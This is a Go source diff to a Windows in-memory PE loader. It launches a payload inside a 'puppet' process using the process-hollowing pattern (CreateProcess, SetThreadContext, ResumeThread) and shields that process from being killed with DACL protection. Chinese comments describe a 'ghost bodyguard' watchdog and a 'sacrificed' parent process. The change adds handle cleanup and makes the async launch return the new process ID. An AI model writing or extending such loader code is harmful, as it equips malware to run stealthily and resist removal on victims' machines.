@@ -16,17 +16,19 @@ const (
 	MEM_RESERVE            = 0x2000
 )
 
-var procGetExitCodeProcess = kernel32.NewProc("GetExitCodeProcess")
+var (
+	procGetExitCodeProcess = kernel32.NewProc("GetExitCodeProcess")
+	procCloseHandle        = kernel32.NewProc("CloseHandle")
+)
 
-// Execute 阻塞运行 PE 字节码，并返回进程退出码 (供幽灵保镖监控使用)
+// Execute 阻塞运行 PE 字节码，并返回进程退出码
 func Execute(targetPath string, payload []byte) (uint32, error) {
 	return executeInternal(targetPath, payload, true)
 }
 
-// ExecuteAsync 异步运行 PE 字节码，不阻塞 (供父进程献祭前秒启动保镖使用)
-func ExecuteAsync(targetPath string, payload []byte) error {
-	_, err := executeInternal(targetPath, payload, false)
-	return err
+// 🌟 修改：ExecuteAsync 异步运行 PE 字节码，不再阻塞，并返回创建的进程 PID
+func ExecuteAsync(targetPath string, payload []byte) (uint32, error) {
+	return executeInternal(targetPath, payload, false)
 }
 
 // 核心内部加载引擎
@@ -59,7 +61,9 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 		return 0, fmt.Errorf("CreateProcess failed: %v", err)
 	}
 
-	// 🌟 为生成的傀儡进程立刻套上 DACL 防杀护甲！
+	defer procCloseHandle.Call(uintptr(pi.Thread))
+	defer procCloseHandle.Call(uintptr(pi.Process))
+
 	protect.ProtectProcessByHandle(pi.Process)
 
 	var pbi PROCESS_BASIC_INFORMATION
@@ -143,7 +147,6 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 	procSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(alignCtx)))
 	procResumeThread.Call(uintptr(pi.Thread))
 
-	// 如果需要等待，则死守并获取退出码
 	if wait {
 		procWaitForSingleObject.Call(uintptr(pi.Process), 0xFFFFFFFF)
 		var exitCode uint32
@@ -151,5 +154,6 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 		return exitCode, nil
 	}
 
-	return 0, nil
+	// 🌟 返回新孵化进程的 PID
+	return pi.ProcessId, nil
 }
